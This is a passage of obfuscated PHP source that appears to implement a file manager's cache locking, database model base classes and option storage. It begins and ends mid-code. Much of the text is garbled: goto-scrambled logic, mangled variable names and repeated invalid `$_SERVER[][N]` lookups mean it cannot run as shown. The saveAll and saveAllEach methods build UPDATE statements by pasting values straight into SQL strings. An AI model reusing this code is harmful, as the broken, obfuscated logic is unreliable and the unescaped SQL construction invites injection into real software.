lock($e, $FՃ = 10) { $A򈻱 = Cache::init(); $E = microtime(!0) + $FՃ; while (microtime(!0) < $E) { $bȗ = $A򈻱->get($e); if (!$bȗ) { $b֔ۧ = $A򈻱->setLock($e, $E, $FՃ); if ($b֔ۧ) { return !0; } } else { if ($bȗ < microtime(!0)) { $A򈻱->set($e, $E, $FՃ * 2); if ($A򈻱->get($e) === $bȗ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($a儰ƛ) { return Cache::init()->get($a儰ƛ); } public function unlock($F) { return Cache::init()->remove($F); } } class CacheLockMemcached { public function lock($CȠ, $BѲ = 0) { $E = Cache::init(); $eϊ = microtime(!0) + $BѲ; while (microtime(!0) < $eϊ) { $a = $E->get($CȠ); if (!$a || $a < microtime(!0)) { $eފƛэ = $E->handle->add($CȠ, $eϊ, $BѲ); if ($eފƛэ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d) { return Cache::init()->get($d); } public function unlock($b˯Ң) { return Cache::init()->remove($b˯Ң); } } class CacheLockDatabase { public function lock($BƸﯽ, $cė = 0) { $f = Model($_SERVER[][802]); $B = microtime(!0) + $cė; while (microtime(!0) < $B) { $BŮ = $f->get($BƸﯽ); if (!$BŮ || $BŮ < microtime(!0)) { $dҔ = $f->set($BƸﯽ, $B); if ($dҔ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Fզݭ) { return Model($_SERVER[][802])->get($Fզݭ); } public function unlock($a) { Model($_SERVER[][802])->remove($a); } } goto eِ; A: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\163\x65\162\164\54\165\160\144\x61\164\145", "\x66\x75\156\143\x74\151\x6f\156"), array("\143\162\145\141\x74\145\124\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\x65\162\164", "\146\165\x6e\143\x74\151\x6f\156")); public function setDataAuto($E߲˛) { $this->dataAuto = $E߲˛; } public function __construct($b̗ = '', $Cʅ = '', $eܼ = '') { parent::__construct($b̗, $Cʅ, $eܼ); } public static function textEncode($d֯ƕ) { if (!$d֯ƕ) { return $d֯ƕ; } $eȌ = json_encode($d֯ƕ); $eȌ = preg_replace_callback($_SERVER[][351], function ($a΅) { return addslashes($a΅[0]); }, $eȌ); return json_decode($eȌ); } public static function textDecode($cڏܮ) { $Eɨ =& $_SERVER[]; $A = json_encode($cڏܮ); $A = preg_replace_callback($Eɨ[352], function ($Cˉ) { return $_SERVER[][96]; }, $A); return json_decode($A); } protected $tableMeta = array(); protected function _beforeInsert(&$fޙ, $C) { $D騨 =& $_SERVER[]; if (!$this->checkDataAutoHas($D騨[353])) { return; } $this->dataBeforeFilter($fޙ, $D騨[353]); } protected function _beforeUpdate(&$BŻ, $c勎) { $A؂ =& $_SERVER[]; if (!$this->checkDataAutoHas($A؂[354])) { return; } $this->dataBeforeFilter($BŻ, $A؂[354]); } protected function _afterSelect(&$f޶, $bِ) { if (!is_array($f޶)) { return; } if (!$this->checkDataAutoHas($_SERVER[][355])) { return; } foreach ($f޶ as &$bՙ) { $this->dataAfterFilter($bՙ); } unset($bՙ); } protected function _afterFind(&$eۋ, $eγ) { if (!is_array($eۋ)) { return; } if (!$this->checkDataAutoHas($_SERVER[][355])) { return; } $this->dataAfterFilter($eۋ); } public function setAutoIncrement($Cϳ) { $d = array($this->getPk() => $Cϳ); $Cʪ = $this->data($d)->add(); if ($Cʪ) { $this->delete($Cʪ); } } public function getAutoIncrement() { $D޾ = $this->getTableName(); $b = $this->max($this->getPk()); $A = $this->query("\x73\150\x6f\x77\40\x74\x61\x62\154\145\40\163\164\141\164\x75\163\40\167\150\x65\x72\x65\x20\x4e\x61\x6d\x65\75\x27{$D޾}\47"); $BƖʆʤ = $A[0][$_SERVER[][356]]; $d = max($b, $BƖʆʤ); return $d; } protected function _callBefore($dБƧ, $cηޓ) { return $this->cacheCallCheck($dБƧ, $cηޓ, !1); } protected function _callAfter($fν, $Aۮ) { return $this->cacheCallCheck($fν, $Aۮ, !0); } protected function cacheFunctionAlias($fڟ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($a, $c첡, $D = false) { $Dꉛ = $this->cacheFunctionAlias($c첡); if (!$Dꉛ) { return; } foreach ($Dꉛ as $e => $f) { $B = $f[0]; $f = explode($_SERVER[][47], $f[1]); if ($a == $e) { return $this->cacheFunctionGet($e, $B); } if ($D && in_array($a, $f)) { $this->cacheFunctionClear($e, $B); } } } public function cacheFunctionGet($D, $A) { $Eճ = $this->cacheKeyMake($D, $A); $D嚢 = Cache::get($Eճ); if (!is_array($D嚢)) { $D嚢 = call_user_func_array(array($this, $D), array($A, !0)); Cache::set($Eճ, $D嚢); } return $D嚢; } public function cacheFunctionClear($Dǰ, $A탉) { $dؓै = $A탉; if (!is_array($A탉)) { $dؓै = array($A탉); } foreach ($dؓै as $fɐΛ) { $fˌ = $this->cacheKeyMake($Dǰ, $fɐΛ); Cache::remove($fˌ); } } private function cacheKeyMake($b, $dֶ) { $f =& $_SERVER[]; return get_class($this) . $f[70] . $b . $f[357] . $dֶ; } protected function selectPageReset() { $bψ =& $_SERVER[]; if (isset($GLOBALS[$bψ[358]])) { return; } $GLOBALS[$bψ[358]] = isset($GLOBALS[$bψ[7]][$bψ[359]]) ? $GLOBALS[$bψ[7]][$bψ[359]] : !1; $GLOBALS[$bψ[360]] = isset($GLOBALS[$bψ[7]][$bψ[349]]) ? $GLOBALS[$bψ[7]][$bψ[349]] : !1; $GLOBALS[$bψ[7]][$bψ[359]] = !1; $GLOBALS[$bψ[7]][$bψ[349]] = !1; } protected function selectPageRestore() { $bĞ =& $_SERVER[]; if (!isset($GLOBALS[$bĞ[358]])) { return; } $GLOBALS[$bĞ[7]][$bĞ[359]] = $GLOBALS[$bĞ[358]]; $GLOBALS[$bĞ[7]][$bĞ[349]] = $GLOBALS[$bĞ[360]]; unset($GLOBALS[$bĞ[358]]); unset($GLOBALS[$bĞ[360]]); } protected function selectPage($fṥ = 200, $Cͷ = 1) { goto E繅ǆ; E繅ǆ: $B脒 =& $_SERVER[]; global $in; $eԏ = $this->optionsValue(); goto c; Dў: $E = array(); $C = 1; if ($Cͷ == 1 && $C) { $this->optionsValue($eԏ); $E = $this->page($Cͷ, $fṥ)->select(); $d贡 = is_array($E) ? count($E) : 0; if ($d贡 <= $fṥ) { $b = 1; } else { $this->optionsValue($D攊ޠ); $d贡 = intval($this->count()); $b = ceil($d贡 / $fṥ); } } else { $this->optionsValue($D攊ޠ); $d贡 = intval($this->count()); $b = ceil($d贡 / $fṥ); $Cͷ = $Cͷ >= $b ? $b : $Cͷ; $this->optionsValue($eԏ); $E = $this->page($Cͷ, $fṥ)->select(); } goto Eĕ; Bǒ: return $DÎÅ; goto fې; D: $D攊ޠ = $eԏ; $D攊ޠ[$B脒[361]] = array(); $fṥ = intval($fṥ); goto F; Eĕ: if (!is_array($E)) { $E = array(); } if ($b == 1) { $d贡 = count($E); } $DÎÅ = array($B脒[362] => array($B脒[363] => $d贡, $B脒[359] => $fṥ, $B脒[349] => $Cͷ, $B脒[364] => $b), $B脒[365] => $E); goto Bǒ; c: $Cޖ = 50000; $fṥ = isset($in[$B脒[359]]) && $in[$B脒[359]] ? $in[$B脒[359]] : $fṥ; if ($fṥ === -1) { $in[$B脒[359]] = !1; $Cޖ = 100000000; $fṥ = $Cޖ; } goto D; F: $fṥ = $fṥ <= 5 ? 5 : ($fṥ >= $Cޖ ? $Cޖ : $fṥ); $Cͷ = intval(isset($in[$B脒[349]]) && $in[$B脒[349]] ? $in[$B脒[349]] : $Cͷ); $Cͷ = $Cͷ <= 1 ? 1 : $Cͷ; goto Dў; fې: } protected function checkLength($aǕ, $BĴ舍 = 0, $f܅ = '') { $cڏ =& $_SERVER[]; $BĴ舍 = $BĴ舍 ? $BĴ舍 : 65536; if (!$aǕ || strlen($aǕ) < $BĴ舍) { return; } $f܅ = $f܅ ? $f܅ . $cڏ[67] : $cڏ[33]; show_json($f܅ . LNG($cڏ[366]) . "\x28{$BĴ舍}\x29", !1); } protected function metaSet($A֠Ғ, $DЖ = null, $E쩔 = null) { goto a; FҞë: $a = $b[371] . $this->tableMeta; CacheLock::lock($a); $A->where(array($A݆벉 => $A֠Ғ))->addAll($C, array(), !0); goto FȂīύ; Eب: if (is_string($DЖ)) { $F֦[$DЖ] = $E쩔; } $C = array(); foreach ($F֦ as $b𭉴 => $CͿ) { $this->checkLength($CͿ, !1, $dɋ . $b[4] . $b𭉴); $C[] = array($A݆벉 => $A֠Ғ, $b[92] => $b𭉴, $b[370] => $CͿ); } goto FҞë; cℕ: if (is_null($DЖ)) { return $A->where(array($A݆벉 => $A֠Ғ))->delete(); } if (is_null($E쩔) && is_string($DЖ)) { return $A->where($cڛ֙»)->delete(); } $F֦ = is_array($DЖ) ? $DЖ : array(); goto Eب; D: $dɋ = $this->tableMeta[$b[368]]; $A = Model($dɋ); $cڛ֙» = array($A݆벉 => $A֠Ғ, $b[369] => $DЖ); goto cℕ; FȂīύ: CacheLock::unlock($a); return !0; goto B; a: $b =& $_SERVER[]; if (!$this->tableMeta || !$A֠Ғ) { return !1; } $A݆벉 = $this->tableMeta[$b[367]]; goto D; B: } public function metaGet($aՍ, $c󎩿 = false) { goto D; e˫: $A䤆 = Model($this->tableMeta[$fت[368]]); if ($c󎩿) { $f = array($cˤ => $aՍ, $fت[92] => $c󎩿); return $A䤆->where($f)->getField($fت[370]); } $f = array($cˤ => $aՍ); goto E섵; D: $fت =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $cˤ = $this->tableMeta[$fت[367]]; goto e˫; E섵: $DД = $A䤆->field($fت[372])->where($f)->select(); $DД = array_to_keyvalue($DД, $fت[92], $fت[370]); return $DД; goto d⥰; d⥰: } private function checkDataAutoHas($bȸ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $b) { if (in_array($bȸ, explode($_SERVER[][47], $b[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$C·, $DȨ) { $aͺ䢑 =& $_SERVER[]; foreach ($this->dataAuto as $dޔԋ) { $Fۻ = $dޔԋ[0]; if (!in_array($DȨ, explode($aͺ䢑[47], $dޔԋ[2]))) { continue; } switch (trim($dޔԋ[3])) { case $aͺ䢑[317]: case $aͺ䢑[318]: $a͹ = $dޔԋ[1]; $f³ = isset($dޔԋ[4]) ? (array) $dޔԋ[4] : array(); if ($a͹ == $aͺ䢑[195] && array_key_exists($Fۻ, $C·)) { if (!$C·[$Fۻ]) { unset($C·[$Fۻ]); } break; } if (isset($C·[$Fۻ])) { array_unshift($f³, $C·[$Fۻ]); } if ($aͺ䢑[317] == $dޔԋ[3]) { $C·[$Fۻ] = call_user_func_array($a͹, $f³); } else { $C·[$Fۻ] = call_user_func_array(array(&$this, $a͹), $f³); } break; case $aͺ䢑[269]: $C·[$Fۻ] = $C·[$dޔԋ[1]]; break; case $aͺ䢑[290]: if (isset($C·[$Fۻ]) && !is_string($C·[$Fۻ])) { $C·[$Fۻ] = json_encode_force($C·[$Fۻ]); } break; case $aͺ䢑[319]: if ($C·[$Fۻ] === $aͺ䢑[33]) { unset($C·[$Fۻ]); } break; case $aͺ䢑[320]: $C·[$Fۻ] = $dޔԋ[1]; default: break; } } if ($DȨ == $aͺ䢑[353]) { $f = strtolower($this->db->getDbType()); if (strpos($f, $aͺ䢑[9]) !== 0) { return; } $fݍҕ = $this->field(!0)->fields; $f惇Ư = $fݍҕ[$aͺ䢑[248]]; if (isset($fݍҕ[$aͺ䢑[247]])) { unset($f惇Ư[$fݍҕ[$aͺ䢑[247]]]); } foreach ($f惇Ư as $B˵ => $DȨ) { if (!isset($C·[$B˵])) { $C·[$B˵] = $aͺ䢑[33]; } } } } private function dataAfterFilter(&$dΖ܎) { $b =& $_SERVER[]; foreach ($this->dataAuto as $A) { $b = $A[0]; if (!in_array($b[355], explode($b[47], $A[2]))) { continue; } if (!isset($dΖ܎[$b])) { continue; } switch (trim($A[3])) { case $b[317]: case $b[318]: $Cꌊ = isset($A[4]) ? (array) $A[4] : array(); array_unshift($Cꌊ, $dΖ܎[$b]); if ($b[317] == $A[3]) { $dΖ܎[$b] = call_user_func_array($A[1], $Cꌊ); } else { $dΖ܎[$b] = call_user_func_array(array(&$this, $A[1]), $Cꌊ); } break; case $b[269]: $dΖ܎[$b] = $dΖ܎[$A[1]]; break; case $b[290]: $aƨ = $dΖ܎[$b]; $dΖ܎[$b] = json_decode($aƨ, !0); if (is_null($dΖ܎[$b])) { $dΖ܎[$b] = $aƨ; } break; case $b[319]: if ($dΖ܎[$b] === $b[33]) { unset($dΖ܎[$b]); } break; case $b[320]: $dΖ܎[$b] = $A[1]; default: break; } } } public function saveAll($aܫĽܖ) { goto D̚췢; f̐: $aܫĽܖ = is_array($aܫĽܖ) ? $aܫĽܖ : array(); $fʖϺ = $A᜛[373]; $Eܽ = 0; goto E빝; D̚췢: $A᜛ =& $_SERVER[]; $Bͬ = $this->tablePrefix . $this->tableName; $f = self::SQL_WHERE_IN_CHUNK; goto f̐; E빝: $a؝ = array(); $Cƶﭺ = count($aܫĽܖ); for ($b = 0; $b < $Cƶﭺ; $b++) { $FКư = $aܫĽܖ[$b]; if (!is_array($FКư) || count($FКư) != 4) { continue; } $c򲊸 = "\x55\120\104\101\x54\105\x20\x60{$Bͬ}\x60\x20\123\x45\124\x20{$FКư[2]}\x20\75\40\x43\x41\x53\105\40{$FКư[0]}\x20\12"; if ($Eܽ == 0) { $fʖϺ = $c򲊸; } $a؝[] = $A᜛[115] . $FКư[1] . $A᜛[115]; $Eܽ++; $fʖϺ .= "\x20\x57\110\x45\116\40\47{$FКư[1]}\x27\x20\x54\x48\x45\116\x20\x27{$FКư[3]}\x27\x20\xa"; if ($Eܽ == $f || $b == $Cƶﭺ - 1) { goto aޱ; aޱ: $E󑐔ۙ = implode($A᜛[47], $a؝); $fʖϺ .= "\40\x45\x4e\x44\40\40\127\110\x45\122\105\x20{$FКư[0]}\40\111\x4e\x20\50{$E󑐔ۙ}\x29\40"; $this->execute($fʖϺ); goto a; C׋: $a؝ = array(); goto Aᕚ; a: $Eܽ = 0; $fʖϺ = $c򲊸; $this->chunkEventCheck(count($a؝)); goto C׋; Aᕚ: } } goto Aū; Aū: $this->chunkEventSet(); goto A; A: } public function saveAllEach($b׬) { $D΋ =& $_SERVER[]; $A = $this->tablePrefix . $this->tableName; foreach ($b׬ as $Dު) { if (!is_array($Dު) || count($Dު) != 4) { continue; } $B = $Dު[0] . $D΋[374] . $Dު[1] . $D΋[115]; $a׈勧 = $Dު[2] . $D΋[374] . $Dު[3] . $D΋[115]; $Bǣ̎ = "\x75\x70\x64\x61\x74\x65\40{$A}\x20\x73\145\x74\x20{$a׈勧}\40\167\x68\145\162\145\x20{$B}\x3b"; $this->execute($Bǣ̎); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($F = false, $Bބ = false) { $this->_chunkEvent = $F; $this->_chunkEventParam = $Bބ; } private function chunkEventCheck($eǥ) { if (!$this->_chunkEvent) { return; } $d = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $d[$_SERVER[][375]] = $eǥ; Hook::trigger($this->_chunkEvent, $d); } public function addAll($f٦, $B痆 = array(), $Dў = false) { goto c; B葜: if (method_exists($this->db, $cɮ[268])) { for ($Eȝ = 0; $Eȝ < count($f٦); $Eȝ += $F庥˻) { $F흱 = array_slice($f٦, $Eȝ, $F庥˻); if (!is_array($F흱) || count($F흱) == 0) { break; } $cقӒ = $this->db->insertAll($F흱, $B痆, $Dў); $this->chunkEventCheck(count($F흱)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($f٦ as $Bȫ => $A) { $cقӒ = $this->db->insert($A, $B痆, $Dў); } $this->commit(); } if (!1 !== $cقӒ) { $F = $this->getLastInsID(); if ($F) { return $F; } } return $cقӒ; goto fԤ; c: $cɮ =& $_SERVER[]; ignore_timeout(); $F庥˻ = self::SQL_WHERE_IN_CHUNK; goto a; a: if (empty($f٦)) { $this->error = think_lang($cɮ[267]); return !1; } $B痆 = $this->_parseOptions($B痆); foreach ($f٦ as $Bȫ => $A) { $f٦[$Bȫ] = $this->_facade($A); $this->_beforeInsert($f٦[$Bȫ], $B痆); } goto B葜; fԤ: } public function save($fđ = '', $a = array()) { goto Dⷳ; Bԥ: for ($e䟼 = 0; $e䟼 < $fܵ; $e䟼 += $c˂) { $E = array_slice($E, $e䟼, $c˂); if (!is_array($E) || count($E) == 0) { break; } $dќ[$B[271]][$A񽄊][1] = $E; $this->optionsValue($dќ); $eھ += parent::save($fđ, $a); $this->chunkEventCheck(count($E)); } $this->chunkEventSet(); return $eھ; goto Dʤߕ; f٦: $E = $dќ[$B[271]][$A񽄊][1]; $E = is_array($E) ? $E : array(); $fܵ = count($E); goto Bԥ; E: $A񽄊 = $this->findWhereField($dќ); if (!$A񽄊) { return parent::save($fđ, $a); } $eھ = 0; goto f٦; Dⷳ: $B =& $_SERVER[]; $c˂ = self::SQL_WHERE_IN_CHUNK; $dќ = $this->optionsValue(); goto E; Dʤߕ: } public function add($aҤ = '', $eÑ橥 = array(), $B = false) { if ($this->addTaskStatus && is_array($aҤ)) { $this->addTaskData[] = $aҤ; return; } return parent::add($aҤ, $eÑ橥, $B); } public function parseWhereLike($a, $fơ˴ = '', $bӲ = false, &$eॾ = false) { goto C; A: if (!is_array($a)) { return $a; } $Aכ = array(); $E = 0; goto d؎; d؎: foreach ($a as $cوу => $Cţ) { if (is_array($Cţ) && count($Cţ) == 2 && $Cţ[0] == $e[378] && is_string($Cţ[1]) && substr($Cţ[1], 0, 1) == $e[379] && substr($Cţ[1], strlen($Cţ[1]) - 1, 1) == $e[379]) { goto A㺓; C燎׉: $Aכ[$E] = $e[382] . $A֏̧ . $e[383] . $fҦ . $e[384]; $E++; continue; goto aǋ; C읂Ϲ: $fҦ = $this->db->escapeString($fҦ); if (!strpos($A֏̧, $e[94])) { $A֏̧ = $e[380] . $A֏̧ . $e[380]; } if ($A߶[$e[381]]) { $fҦ = $e[115] . $fҦ . $e[115]; } goto C燎׉; A㺓: $eॾ = !0; $A֏̧ = is_string($cوу) ? $cوу : $fơ˴; $fҦ = substr($Cţ[1], 1, strlen($Cţ[1]) - 2); goto C읂Ϲ; aǋ: } if (is_array($Cţ)) { $fơ˴ = is_string($cوу) ? $cوу : $fơ˴; $Cţ = $this->parseWhereLike($Cţ, $fơ˴, !0, $eॾ); } if (is_numeric($cوу)) { $Aכ[$E] = $Cţ; $E++; } else { $Aכ[$cوу] = $Cţ; } } if ($eॾ && !$bӲ) { trace_log(array($Aכ, $a), $e[271]); } return $Aכ; goto dʫΤ; C: $e =& $_SERVER[]; $A߶ = $GLOBALS[$e[6]][$e[376]]; if (!$A߶[$e[377]]) { return $a; } goto A; dʫΤ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Fԇע = array()) { goto aݱ; B荑: $CĬ = is_array($CĬ) ? $CĬ : array(); $B = null; for ($Dڍ̤ = 0; $Dڍ̤ < count($CĬ); $Dڍ̤ += $cϑ) { $cפ = array_slice($CĬ, $Dڍ̤, $cϑ); if (!is_array($cפ) || count($cפ) == 0) { break; } $dŔ[$eŪ՞[271]][$Fˋ][1] = $cפ; $this->optionsValue($dŔ); $e = parent::select($Fԇע); if (!$e) { continue; } if (is_null($B)) { $B = array(); } $B = array_merge($B, $e); } goto E; BА: $Fˋ = $this->findWhereField($dŔ); if (!$Fˋ || isset($dŔ[$eŪ՞[288]]) || isset($dŔ[$eŪ՞[349]])) { return parent::select($Fԇע); } $CĬ = $dŔ[$eŪ՞[271]][$Fˋ][1]; goto B荑; aݱ: $eŪ՞ =& $_SERVER[]; $cϑ = self::SQL_WHERE_IN_CHUNK; $dŔ = $this->optionsValue(); goto BА; E: return $B; goto Cݒ֔; Cݒ֔: } public function delete($Aݷ = array()) { goto A; Dݡ䐔: $B왤 = $this->findWhereField($A); if (!$B왤) { return parent::delete($Aݷ); } $A = 0; goto a; Eװ: return $A; goto fǴ; A: $Aҭ =& $_SERVER[]; $B = self::SQL_WHERE_IN_CHUNK; $A = $this->optionsValue(); goto Dݡ䐔; a: $D = $A[$Aҭ[271]][$B왤][1]; $D = is_array($D) ? $D : array(); for ($eּ = 0; $eּ < count($D); $eּ += $B) { $aι = array_slice($D, $eּ, $B); if (!is_array($aι) || count($aι) == 0) { break; } $A[$Aҭ[271]][$B왤][1] = $aι; $this->optionsValue($A); $A += parent::delete($Aݷ); } goto Eװ; fǴ: } private function findWhereField($f) { $BƩ =& $_SERVER[]; $b = self::SQL_WHERE_IN_CHUNK; if (!is_array($f) || !is_array($f[$BƩ[271]])) { return !1; } foreach ($f[$BƩ[271]] as $c => $fǵâ) { if (is_array($fǵâ) && isset($fǵâ[0]) && is_string($fǵâ[0]) && strtolower($fǵâ[0]) == $BƩ[7] && is_array($fǵâ[1]) && count($fǵâ[1]) > $b) { ignore_timeout(); return $c; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\155\117\160\164\151\157\x6e"; public $field = array(); public function listData($a = false, $e˫ؙ = "\x6d\157\144\151\x66\x79\x54\151\155\145", $Dܜӗ = false) { $A㉴φ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$A㉴φ) { return $a ? null : array(); } if (!$a) { $A㉴φ = array_filter(array_values($A㉴φ)); return array_sort_by($A㉴φ, $e˫ؙ, $Dܜӗ); } return $A㉴φ[$_SERVER[][385] . $a]; } public function insert($aڞҷ) { goto d⤬; Bϵ: return $Dϗ; goto cӾ; a: $aڞҷ[$f[83]] = time(); Model($this->modelType)->set($f[386], $Dϗ, $this->optionType . $f[387]); Model($this->modelType)->set($f[385] . $Dϗ, $aڞҷ, $this->optionType); goto Bϵ; d⤬: $f =& $_SERVER[]; $aڞҷ = array_field_key($aڞҷ, $this->field); $Dϗ = Model($this->modelType)->get($f[386], $this->optionType . $f[387]); goto EӒ; EӒ: $Dϗ = $Dϗ ? $Dϗ : 0; $aڞҷ[$f[388]] = ++$Dϗ; $aڞҷ[$f[192]] = time(); goto a; cӾ: } public function update($aۄ, $bŞ҂) { goto cػ; cػ: $BɆƭ =& $_SERVER[]; $bŞ҂ = array_field_key($bŞ҂, $this->field); $f㢼Ŧ = $this->listData($aۄ); goto FԱׄԷ; FԱׄԷ: if (!$f㢼Ŧ) { return !1; } $bŞ҂ = array_merge($f㢼Ŧ, $bŞ҂); $bŞ҂[$BɆƭ[83]] = time(); goto dς; dς: return Model($this->modelType)->set($BɆƭ[385] . $aۄ, $bŞ҂, $this->optionType); goto e; e: } public function remove($Eã鞒) { return Model($this->modelType)->remove($_SERVER[][385] . $Eã鞒, $this->optionType); } public function clear() { $D닌 =& $_SERVER[]; Model($this->modelType)->remove($D닌[386], $this->optionType . $D닌[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Eո, $bҩ) { if (!$bҩ) { return !1; } $F = $this->listData(); $F = array_to_keyvalue($F, $Eո); return isset($F[$bҩ]) ? $F[$bҩ] : !1; } public function findByName($dڪ) { return $this->findByKey($_SERVER[][28], $dڪ); } protected function resetData($Cʟ) { $BĻ =& $_SERVER[]; $Cʟ = is_array($Cʟ) ? $Cʟ : array(); $Eԋ = array(); for ($d = 0; $d < count($Cʟ); $d++) { $Eԋ[$BĻ[385] . $Cʟ[$d][$BĻ[388]]] = $Cʟ[$d]; } return Model($this->modelType)->set($Eԋ, !1, $this->optionType); } private function getAutoName($fǯ壷) { $a = array_to_keyvalue($this->listData(), $_SERVER[][28]); if (!$a || !isset($a[$fǯ壷])) { return $fǯ壷; } for ($cņꈺ = 1; $cņꈺ < count($a); $cņꈺ++) { $eث = $fǯ壷 . "\50{$cņꈺ}\x29"; if (!isset($a[$eث])) { return $eث; } } return $eث; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($A = false, $D = '', $A = false) { goto A; b˃: $DÎ = is_array($DÎ) ? $DÎ : array(); if (is_array($a堌)) { $a堌 = array_merge($DÎ, $a堌); return $A ? isset($a堌[$A]) ? $a堌[$A] : null : $a堌; } $c̅ = $this->filterWhere(array($eޤ籑[29] => $D)); goto F䧏; F䧏: $a堌 = $this->where($c̅)->select(); $a堌 = array_to_keyvalue($a堌, $eޤ籑[92], $eޤ籑[370]); foreach ($a堌 as $Eˇ鮍 => $A͆) { if ($A || in_array($Eˇ鮍, $this->jsonField)) { $a堌[$Eˇ鮍] = json_decode($A͆, !0); } } goto dʯݼ; A: $eޤ籑 =& $_SERVER[]; $a堌 = $this->cacheGet($D); $DÎ = $this->optionDefault($D); goto b˃; dʯݼ: $this->cacheSet($D, $a堌); $a堌 = array_merge($DÎ, $a堌); return $A ? $a堌[$A] : $a堌; goto E⦏; E⦏: } public function set($B, $eԶ = false, $cΨ = '') { goto D; cÒ: $c = is_array($B) ? $B : array($B => $eԶ); foreach ($c as $e˪ => $fڼ) { if (is_array($fڼ)) { $fڼ = json_encode_force($fڼ); } $this->checkLength($fڼ, !1, $this->tableName . $fߍ[4] . $B); $fڼ = self::textEncode($fڼ); $c = array($fߍ[29] => $cΨ, $fߍ[92] => $e˪, $fߍ[370] => $fڼ); $bՋ[] = $this->filterWhere($c); } if (!$bՋ) { return !0; } goto d鶪; D: $fߍ =& $_SERVER[]; $this->cacheRemove($cΨ); $bՋ = array(); goto cÒ; d鶪: return $this->addAll($bՋ, array(), !0); goto Cϗ; Cϗ: } protected function optionDefault($D = '') { return !1; } public function setDeep($B, $C܍ = false, $d = '') { $f = explode($_SERVER[][94], $B); $d˖ = $this->get(); array_set_value($d˖, $B, $C܍); $this->set($f[0], $d˖[$f[0]], $d); } public function remove($bĸ͍̜, $Bپ = '') { $F脂 =& $_SERVER[]; $this->cacheRemove($Bپ); $Eϊ = $this->filterWhere(array($F脂[92] => $bĸ͍̜, $F脂[29] => $Bپ)); if (is_null($bĸ͍̜)) { unset($Eϊ[$F脂[92]]); } return $this->where($Eϊ)->delete(); } public function cacheSet($a޳, $c = false) { return Cache::set($this->cacheKey($a޳), $c); } public function cacheGet($fâ) { return Cache::get($this->cacheKey($fâ)); } public function cacheRemove($bܵà) { return Cache::remove($this->cacheKey($bܵà)); } protected function filterWhere($Bݿ) { return $Bݿ; } protected function cacheKey($B⣶ʙ) { return $B⣶ʙ; } } goto a; F̦: function binCheckBigger($fʳ싾, $Bޭ֎) { return $fʳ싾 > $Bޭ֎; } $_SERVER[$_SERVER[][3]] = (base64_decode('ODg4Ng==')."\63\64")+0;$_yWfk="nSmJ8VM6MwUUfGakDjABUPJdjEkF9vSY9XAXHwNTB7xUBrevR5JiWNQYCKm6dkge7rtzaGX";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($b, $AҬ) { $d =& $_SERVER[]; if (isset(self::$_methodList[$b])) { return @call_user_func_array(self::$_methodList[$b], $AҬ); } else { if (method_exists($this, $b)) { return call_user_func_array(array($this, $b), $AҬ); } else { think_exception(__CLASS__ . $d[4] . $b . $d[5]); } } } public static function __callStatic($e, $bȚ) { if (isset(self::$_methodListStatic[$e])) { return call_user_func_array(self::$_methodListStatic[$e], $bȚ); } else { if (method_exists(self, $e)) { return call_user_func_array(array(self, $e), $bȚ); } else { show_json("{$e}\50\x29\x20\x6e\157\x74\x20\145\x78\x69\x73\164\73", !1); } } } public static function addMethod($EԒ, $Aˏ) { self::$_methodList[$EԒ] = $Aˏ; } public static function addMethodStatic($EՆۖ, $DÐ) { self::$_methodListStatic[$EՆۖ] = $DÐ; } } goto c未; a: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\x65"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\141\155\145" => "\x69\157\137\x73\x6f\165\162\x63\x65\x5f\155\x65\164\141", "\x6d\145\x74\141\106\151\x65\154\x64" => "\163\x6f\x75\162\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\155\145", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\x75\x6e\143\x74\151\157\156"), array("\x63\x72\x65\141\x74\145\124\x69\x6d\145", "\164\x69\x6d\x65", "\151\156\163\x65\162\164", "\146\x75\x6e\x63\164\151\157\x6e"), array("\166\x69\x65\167\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\156\163\145\x72\164", "\x66\x75\156\x63\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($AÈ) { return $this->listSource(array($_SERVER[][389] => $AÈ)); } public function typeName($bН) { static $dԚ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\160"); return $dԚ[$bН . $_SERVER[][33]]; } public function sourceListInfo($B̖, $Dዕ = false) { goto Bڏ; EԞŗ: return array_to_keyvalue($f潫, $Eݨ[390]); goto aţ; Aً: if (!$B̖) { return array(); } $f潫 = $this->where(array($Eݨ[390] => array($Eݨ[7], $B̖)))->select(); $this->_listDataApply($f潫, $Dዕ); goto EԞŗ; Bڏ: $Eݨ =& $_SERVER[]; 